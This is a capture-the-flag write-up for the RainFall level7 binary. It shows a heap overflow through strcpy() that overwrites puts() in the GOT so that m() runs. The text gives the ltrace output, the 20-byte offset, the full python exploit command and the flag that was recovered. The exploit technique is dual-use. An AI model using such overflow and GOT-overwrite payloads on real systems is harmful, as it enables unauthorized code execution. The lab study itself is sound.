The decompiled program contains a main() function and an m() function that is never called. The main() function expects two parameters and segfault if they are missing. Those parameters are recorded on the heap in two different instances of a structure (see [source.c file](source.c) for more details), using malloc() and strcpy(). After that, the /home/user/level8/.pass file is opened and its content is stored in a global variable c. Finally, there is a useless printf(), which has been replaced by puts() by the compiler for optimization purposes.

What we can do here is to overflow the buffer of the first strcpy() call, so that the destination of the second strcpy() is changed. What we want to pass here is the address of the puts() function in the [global offset table (GOT)](https://en.wikipedia.org/wiki/Global_Offset_Table#:~:text=The%20Global%20Offset%20Table%2C%20or,data%20is%20loaded%20at%20runtime.), and what we want to put there is the address of the m() function.

This is made possible because the address space layout randomization ([ASLR](https://www.networkworld.com/article/3331199/what-does-aslr-do-for-linux.html)) is off.

So let's find out how many bytes are needed to reach b->s from a->s. Let's use ltrace for this:
```
level7@RainFall:~$ ltrace ./level7 AAAAAAAAAAAAAAAAAAAAAAAAA BBBB
__libc_start_main(0x8048521, 3, 0xbffff7b4, 0x8048610, 0x8048680 <unfinished ...>
malloc(8)                                                             = 0x0804a008
malloc(8)                                                             = 0x0804a018
malloc(8)                                                             = 0x0804a028
malloc(8)                                                             = 0x0804a038
strcpy(0x0804a018, "AAAAAAAAAAAAAAAAAAAAAAAAA")                       = 0x0804a018
strcpy(0x41414141, "BBBB" <unfinished ...>
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++
```
Here we see that the first argument of the second strcpy() is filled with 'A' (0x41414141) so we are overwriting it right now. After some adjustments, we find that the offset is 20 bytes.

Let's now craft our parameters. The first argument needs 20 bytes of padding, followed by the puts() address on the GOT, in the little endian convention (in gdb, use the `disas puts` command). The second argument simply needs the m() function address, also in the little endian convention (in gdb, use the `info functions` command).
```
level7@RainFall:~$ ./level7 $(python -c 'print "A" * 20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9 - 1657334108
```
We can now reach to the next level with the command `su level8` and fill in the flag found as a password.